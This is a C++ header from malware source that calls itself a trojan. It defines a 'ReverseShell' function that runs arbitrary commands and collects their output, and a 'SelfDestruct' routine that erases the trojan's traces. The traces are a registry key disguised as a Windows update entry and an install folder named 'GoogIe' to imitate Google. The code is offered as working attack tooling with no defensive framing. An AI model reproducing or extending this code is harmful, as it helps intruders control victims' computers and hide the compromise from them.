/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<other.hpp>
This header contains functions that don't fall under any category.

*/

#include <iostream>
#include <memory>
#include <windows.h>
#include <filesystem>

#pragma once

extern bool ALIVE;

std::string ReverseShell(std::string command) {
    const int chunkSz = 4092;
    std::shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
    char buffer[chunkSz];
    std::string res;
    while (!feof(pipe.get())) {
        if (fgets(buffer, chunkSz, pipe.get()) != NULL) {
            res += buffer;
        }
    }
    return res;
}

void SelfDestruct() {
    
    // Cleanup registry key
    RegDeleteKeyA(HKEY_CURRENT_USER, "WINDOWS_UPDATE_REGISTRY_INFO");

    // Delete files
    char username[256];
    DWORD dwUSize = 256;
    GetUserName(username, &dwUSize);
    std::string folderPath = "C:/Users/";
    folderPath += username;
    folderPath += "/AppData/Local/GoogIe";
    std::filesystem::remove_all(folderPath);

    ALIVE = false;
}